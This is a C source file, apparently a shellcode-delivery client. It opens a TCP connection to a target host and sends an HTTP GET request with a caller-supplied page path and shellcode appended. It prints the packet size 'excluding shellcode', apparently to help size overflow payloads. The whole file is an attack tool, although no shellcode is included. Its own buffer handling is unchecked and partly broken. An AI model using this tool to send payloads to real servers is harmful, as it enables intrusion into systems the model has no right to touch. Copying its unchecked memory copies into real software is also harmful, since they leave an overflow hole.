#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define BUFFER_SIZE 4096

const char default_header[] = " HTTP/1.1\t\n\n";

int main(int argc, char *argv[]) {

    int sockfd, portno, n;
    struct sockaddr_in serv_addr;
    char *serv_host_addr, *page = NULL, *shellcode = NULL;

    if (argc < 3) {
        printf("Host address or port number is missing.\n");
        exit(0);
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd < 0) {
        printf("Can't open stream socket.\n");
        exit(1);
    }

    serv_host_addr = argv[1];
    portno = atoi(argv[2]);
    if (argv[3] != NULL)
        page = argv[3];
    if (argv[4] != NULL && strncmp(argv[4], "ORBIT_SOCKETDIR", 15) != 0)
        shellcode = argv[4];
    else
        shellcode = argv[4] = NULL;
    bzero((char *) &serv_addr,sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(serv_host_addr);
    serv_addr.sin_port = htons(portno);
    if (connect(sockfd,(struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        printf("Cannot connect to server.\n");
        exit(1);
    }

    char buffer[BUFFER_SIZE];
    int i;

    memset(buffer, '\0', sizeof(buffer));
    memcpy(buffer, "GET /", 5);
    i = 5;
    if (page != NULL) {
        memcpy(buffer + i, page, strlen(page));
        i += strlen(page);
        memcpy(buffer + i, default_header, sizeof(default_header)/sizeof(char));
        i += sizeof(default_header)/sizeof(char);
        printf("Size of packet excluding shellcode: %d\n", i);
        if (shellcode != NULL) {
            memcpy(buffer + i, shellcode, strlen(shellcode));
            i += strlen(shellcode); }
    } else {
        memcpy(buffer + i, default_header, sizeof(default_header)/sizeof(char));
        i += sizeof(default_header)/sizeof(char);
        printf("Size of packet excluding shellcode: %d\n", i);
        if (shellcode != NULL) {
            memcpy(buffer + i, shellcode, strlen(shellcode));
            i += strlen(shellcode);
        }
    }

    buffer[++i] = '\0';
    /*printf("buffer len: %d\n", i);
    int j;
    for (j = 0; j < i; j++)
      printf("%c", buffer[i]);
    printf("\n");*/

    n = write(sockfd, buffer, i);
    printf("Write status: %d\n", n);
    if (n < 0) {
        printf("Write error.\n");
        exit(1);
    }

    printf("Awaiting response from server..\n");
    bzero(buffer, BUFFER_SIZE);
    n = read(sockfd, buffer, BUFFER_SIZE - 1);
    printf("Read status: %d\n", n);
    if (n < 0) {
        printf("Read error.\n");
        exit(1);
    }

    printf("\n%s\n", buffer);

    return 0;
}